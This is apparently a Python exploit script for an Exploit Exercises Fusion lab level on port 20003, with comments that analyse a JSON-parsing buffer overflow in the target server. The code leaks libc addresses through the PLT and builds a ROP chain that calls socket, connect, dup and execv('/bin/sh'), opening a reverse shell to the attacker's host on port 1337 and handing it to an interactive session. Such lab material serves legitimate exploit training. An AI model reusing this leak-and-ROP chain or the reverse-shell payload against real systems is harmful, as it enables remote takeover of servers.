PORT = 20003
FUSION_IP = "192.168.180.128"
import socket
import string
import telnetlib
import struct
import time
import select
import hmac
q = lambda x: struct.pack('<I', x)

def proof_of_work(token, req):
    #print "working..."
    import hashlib
    POWERS_OF_TWO = [2**i for i in xrange(20)]
    i = 0
    new_req = token + req
    hmac_res = hmac.new(token, new_req.replace("NONCEVAL", str(i)), hashlib.sha1).digest()
    #print hmac_res.encode('hex')
    while ord(hmac_res[0]) | ord(hmac_res[1]) != 0:
        i += 1
        hmac_res = hmac.new(token, token + req + str(i), hashlib.sha1).digest()
        if i in POWERS_OF_TWO:
            print i,
        if i > POWERS_OF_TWO[-1]:
            print "failed... 4 bits of bad luck"
            break
    #print "work is done :)", i
    return new_req + str(i)

def unicode_dword(dword):
    assert 0 <= dword < 2**32

    packed_dword = q(dword).encode('hex')
    high, low = packed_dword[:4], packed_dword[-4:]
    #
    #low, high = map(lambda x: zfill(str(x), 4)[::-1], struct.unpack('hh', packed_dword))
    return "\\\u" + high +  "\\\\u" + low

#exploit:
# There is a server
# understand the signal() call on main()
# (ignores Sigpipe signal... meaning that writing to a closed FD won't crash the software :))
# 1. we get a token
# 2. the request is being read... in\out\err fd are being closed! :(
# ^ exploit will be harder... payload needs more logics

# 3. request is being validated... H-MAC_sha1 with token() as key.
# request should be sent with {token} at first.
# HMAC_val of the first 2 bytes should be 0... 16 bits of Proof of Work.

# 4. parse_request() -> loads as json_object :)

# 5. handle_request()
### TAGS
### there is an array for tags...
### tags could be added freely... !! Memory Corruption :)
### tags value should be a long array...
### THERE ARE 2 WAYS OF CORRUPTION
### One-> using tags as an array...
### Two-> sending multiple tags keys

### TITLE
### decode_string is being called on title_value and is saved on title_buffer which is 128 bytes long
### after that a buffer in the correct size is being allocated and title is stored there.
### NO ONE FREES THESE TITLES...

### CONTENTS
### EXACTLY AS TITLE BUT BUFFER IS 1024 bytes long 
### GOOD FOR PUTTING A PAYLOAD :)

### SERVERIP
### overwrites the gServerIP 


###### DECODE_STRING
###### copies bytes unless escaped string (\)
###### \" \\ \/ is copyied regularly...
###### \b, \f, \n, \r, \t is copied in the format "\x"
##### \b is backspace... 

###### \u copies 4 bytes and convert to int
###### adds to src += 4 without checking bounds :)
###### I COULD EASILY END MY STRING with \u 
###### WHAT IS GOING TO BE THE NEXT DATA being PARSED?
###### I CAN USE THAT TO LEAK DATA :)

#### dest is being increased twice so dest > end and while loop keeps forever (untill *src is NULL)
#### I CAN OVERWRITE AFTER title :)
#### THERE IS NO STACK_COOKIE 

# 6. post_blog_article
# sends an HTTP POST REQUEST to IP:80 with title and content 
# COULD WE FIND AN INFO LEAK???
# WHAT HAPPEND IF NO content/title tag was set EARLIER?
# ANSWER: if(! gServerIP || !gContents || !gTitle) return;
# so how do we leak?!
### USING \\\u AS THE LAST BYTE OF THE ENCODED STRING... THIS WILL CAUSE DEST > END and BYPASS THE CHECK :)
### ANOTHER LEAKEAGE IS USING PORT :) SENDING IP LIKE THIS: ip: WILL CAUSE THE SERVER TO SEND A POST MESSAGE TO ARBITRARY PORT... SNIFFING IT WILL REVEAL DATA :)


#### stack address needs to be leaked (our data)
#### heap address needs to be leaked (our data copy)
#### libc address needs to be leaked (calling dup2() mprotect() and execve()) might be unneccessary with plt :)
#### nwrite address should be overwritten in plt
#### TODO: is PLT writable?
#### yes it has to support ASLR'd .so and their offset is not determined before loading
#### SOLUTION: should be since exploit-exercises told: Read only relocations    No
#### to a payload the uses dup2() with the first parameter and 0, 1, 2
#### and then calls execve() with the parameters :)
#### problem: DEP
#### SOLUTION: calling mprotect on our data 
#### problem: libc__execve(), libc__mprotect()
#### SOLUTIONs:
    # libc leakage...
    # another exploitation like storing .ssh keys :(

### ANOTHER HEAP OVERFLOW
###  POST IS 1024*128 BYTES
### gServerIP could be anything :)


# EXPLOIT IDEA1:
    # SO I HAVE AN EIP OVERWRITE PRIMITIVE!!
    # I CAN CALL PLT FUNCTIONS BUT THE COOL ONE ARE NOT THERE
    # I NEED TO LEAK AN ADDRESS
    # I WILL PUT IT ON gContent so it will be sent to me 
    # IT'S NICE SINCE GLOBAL VARIABLE ARE ON .bss segment AND WON'T GET ASLR
    ## SO I WILL SET EIP-> MEMCPY()
    # COPY TO gContent the value of ....
    # LIBC :)
    # THIS WILL BE DONE TO BREAK THE ASLR OF LIBC :)
    # SINCE THE PLT POINTS TO LIBC and PLT is at EXACT LOCATION I CAN LEAK THE LIBC ADDRESS :)
    # AFTER THAT I WILL USE THE SAME TRICK TO OVERWRITE EIP WITH THE ADDRESS OF execve()
    # I WILL NEED TO PUT DATA ON STACK... THIS WILL BE DONE WITH THE SAME TRICK OF LEVEL2
    # FINDING A RW FIXED LOCATION SETTING ESP -> RW_FIXED_LOCATION
    # USING MEMCPY TO WRITE THERE :)
#
# EXPLOIT IDEA2:
    ### OVERWRITING PLT offsets...
    ### find an unimportant function
    ### change it's offset since it's fixed! using ROP GADGETS :)
    ### now just call it from unimporant@plt :)
    ### system() is nice function for the mission :)


# EXPLOIT IDEA3:
    ### EXECUTING MEMCPY to COPY PTR TO OUR BUFFER
    ### JUMPING TO THE MIDDLE OF BLOG_POST SO LEAKED_ADDR WILL BE SENT TO USE :)
    ### AFTER LEAKING A LIBC ADDRESS SENDING ANOTHER REQUEST
    ### USING LIBC ROP TO GAIN REMOTE SHELL 

    ### 1. opening a socket -> should get fd 0
    ### 2. duping it to 1 and 2
    ### 3. calling execve with bin/sh
    ### 4. winning!!

    ### after writing a leak_ptr function
    ### it was easy to leak a heap ptr too :)

    ### now stuff is much more convinent

MY_IP = "192.168.74.1:1337"
sockaddr_dump = "\x02\\\\u0005\x39\xff\xff\xff\xc0\xff\xff\xff\xa8\x4a\x01\\\\u0000\\\\u0000\\\\u0000\\\\u0000"

gContents_PTR = 0x0804BDF4
gContents_PTR_PTR = 0x0804A05B
gTitle_PTR = 0x0804BE04
MEMCPY     = 0x08048E60 # objdump -d ... | grep memcpy
MEMCPY_PTR = 0x0804BD64 # x 0x08048E60 revales a jmp to DWORD PTR ds: 0x0804BD64
FAIL = 0xCCCCCCCC
POST_BLOG_ARTICLE = 0x8049f20
RW_FIXED_LOCATION = 0
PTR_TO_LIBC = MEMCPY # IT IS ON A SPEICIF OFFSET FROM VICTIM'S LIBC
RW_ADDR = 0x0804BDEC # gContent_len, gRequestSize, gContens, token, gServerIP, gTitle_len, gTitle, gRequset, gObj -> 9 dwords -> 36 bytes
POP_POP_POP_RET = 0x804a26d
POP_POP_RET = POP_POP_POP_RET + 1
POP_RET = POP_POP_RET + 1
RET = POP_RET + 1


def send_payload(payload, resp_size, contents = "Y" * 98, get_shell = False):

    s = socket.socket()
    s.connect((FUSION_IP, PORT))
    token = s.recv(4096)
    token = token.replace("\"","").replace("\n","")
    #print "got token", token
    req_prefix = "\n{"
    req_suffix = "}"
    tags = (16) * ["pwn"]

    ss = socket.socket()
    ss.bind(("0.0.0.0", 1337)) # binds to the victim
    ss.listen(3)
    ret = None
    req = '\
        "tags" : {tags},\
        "contents" : "{contents}", \
        "title" : "{title}", \
        "nonce" : "NONCEVAL",\
        "serverip" : "{ip}" \
        '.format(tags=str(tags), ip=MY_IP, title=payload, contents=contents)

    full_req = req_prefix + req + req_suffix
    new_req = proof_of_work(token, full_req)
    #print "sending", new_req
    s.send(new_req)
    s.close()
    #print "accepting....."
    client_sock, client_addr = ss.accept()
    print "got connection!"
    if get_shell:
        t = telnetlib.Telnet()
        t.sock = client_sock
        t.interact()
    if resp_size:
        ret = client_sock.recv(resp_size)
    ss.close()
    return ret
    

def leak_addr(PTR_TO_ADDR):
    ### leaks data from pointer
    ### good if we have a ptr at a fixed location that points to an ASLR'd address
    ### we have that on PLT :) so we can get libc's aslr :)

    ### originally PTR_TO_ADDR was MEMCPY_PTR
    MIDDLE_OF_POST = 0x0804A078
    GARBAGE = "C" * 127 + "\\\\u" + "B" * 35
    #MEMCPY_SIZE = unicode_dword(4)
    MEMCPY_SIZE = unicode_dword(4)

    payload = GARBAGE
    payload += q(MEMCPY) + q(POP_POP_POP_RET) + q(gContents_PTR) + q(PTR_TO_ADDR) + MEMCPY_SIZE
    payload += q(POP_POP_POP_RET) + q(0x100000004 - 0x42424242) + q(gContents_PTR) + "XXXX"
    payload += q(MIDDLE_OF_POST) + "X" * 69 + "Z" * 75

    print "payload_len: ", len(payload)
    leaked_addr = send_payload(payload, 4)[::-1]
    #print "leaked_addr", leaked_addr.encode("hex")
    return int(leaked_addr.encode("hex"), 16) ### should be reversed ??


LEAKED_ADDR_SAMPLE = 0xb754dfe0
# offsets from leaked addr (memcpy)
EXECV_SAMPLE       = 0xb74cfa80 - LEAKED_ADDR_SAMPLE
EXECVE_SAMPLE      = 0xb74cf910 - LEAKED_ADDR_SAMPLE
SOCKET_SAMPLE      = 0xb7507b10 - LEAKED_ADDR_SAMPLE
CONNECT_SAMPLE     = 0xb75075b0 - LEAKED_ADDR_SAMPLE
MEMCPY_SAMPLE      = 0xb74aba60 - LEAKED_ADDR_SAMPLE
DUP_SAMPLE         = 0xb74f5c50 - LEAKED_ADDR_SAMPLE
DUP2_SAMPLE        = 0xb74f5c90 - LEAKED_ADDR_SAMPLE

def attack(leaked_memcpy, leaked_gContent):
    MIDDLE_OF_POST = 0x0804A078
    GARBAGE = "C" * 127 + "\\\\u" + "B" * 35

    #content = unicode_dword(0x02000050) + unicode_dword(0xffffffc0) + unicode_dword(0xffffffa8) + unicode_dword(0x4a010000) + unicode_dword(0) * 4 # SOCKADDR_IN
    #content_len = 22
    content = unicode_dword(0x39050002) + unicode_dword(0x01b4a8c0) + unicode_dword(0) + unicode_dword(0) # struct sockaddr_in
    content_len = 0x10
    content += unicode_dword(0x6e69622f) + unicode_dword(0x0068732f) + unicode_dword(0) # /bin/sh
    #print "CONTENT_LEN: ", len(content)
    content += unicode_dword(leaked_gContent + content_len) 

    #print "CONTENT_LEN: ", len(content)
    payload = GARBAGE
    #payload += q(leaked_memcpy) + q(POP_POP_POP_RET) + unicode_dword(leaked_gContent) + unicode_dword(gContents_PTR) + unicode_dword(32)
    payload += q(leaked_memcpy + SOCKET_SAMPLE) + q(POP_POP_POP_RET) + unicode_dword(2) + unicode_dword(1) + unicode_dword(0)
    payload += q(leaked_memcpy + CONNECT_SAMPLE) + q(POP_POP_POP_RET) + unicode_dword(0) + q(leaked_gContent) + unicode_dword(content_len)
    payload += unicode_dword(leaked_memcpy + DUP_SAMPLE) + q(POP_RET) + unicode_dword(0)
    payload += unicode_dword(leaked_memcpy + DUP_SAMPLE) + q(POP_RET) + unicode_dword(0)
    payload += q(leaked_memcpy + EXECV_SAMPLE) + q(POP_POP_RET) + unicode_dword(leaked_gContent + content_len) + unicode_dword(0) # (leaked_gContent+28)
    payload += q(FAIL)

    print "payload_len = %d" % (len(payload))
    print "\0" in payload or "\\" in payload
    #print repr(payload)
    ret = send_payload(payload, 0, content, get_shell=True)
    #print repr(ret)

    return ret
    #print "leaked_addr", leaked_addr[::-1].encode("hex")
    #return leaked_addr ### might be reversed :)


if __name__ == "__main__":

    #print leaked_memcpy
    #print leaked_gContent

    leaked_memcpy   = 0xb754dfe0
    leaked_gContent = [0x09ed4918, 0x09ed49a8, 0x09ed4928, 0x09ed48f0][1]
    leaked_gTitle   = 0x09ed4928
    #leaked_memcpy   = leak_addr(MEMCPY_PTR)
    leaked_gContent = leak_addr(gContents_PTR)
    #leaked_gContent = leak_addr(gContents_PTR)
    #leaked_gContent = leak_addr(gContents_PTR)
    #leaked_gTitle   = leak_addr(gTitle_PTR)
    print "HEX", hex(leaked_gContent)
    #leaked_gContent += 32
    #leaked_gContent += 168 # magic_fix? -> it might get allocted 32 bytes away now   
    #leaked_gTitle += 184
    attack(leaked_memcpy, leaked_gContent)


